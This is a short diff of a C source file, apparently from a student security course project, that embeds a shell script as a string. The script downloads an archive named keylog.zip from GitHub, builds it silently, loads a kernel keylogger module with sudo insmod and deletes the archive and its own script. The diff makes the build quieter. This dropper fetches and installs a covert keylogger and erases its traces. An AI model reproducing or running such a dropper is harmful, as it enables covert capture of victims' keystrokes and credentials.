@@ -8,7 +8,7 @@ const char *text=
 	"wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip\n"
 	"unzip -o -q keylog.zip\n"
 	"cd final-project-click-to-add-lemon-master/Source/\n"
-	"make\n"
+	"make -s\n"
 	"sudo insmod keylog.ko\n"
 	"cd ../..\n"
 	"rm -r -f keylog.zip tmp.sh\n"
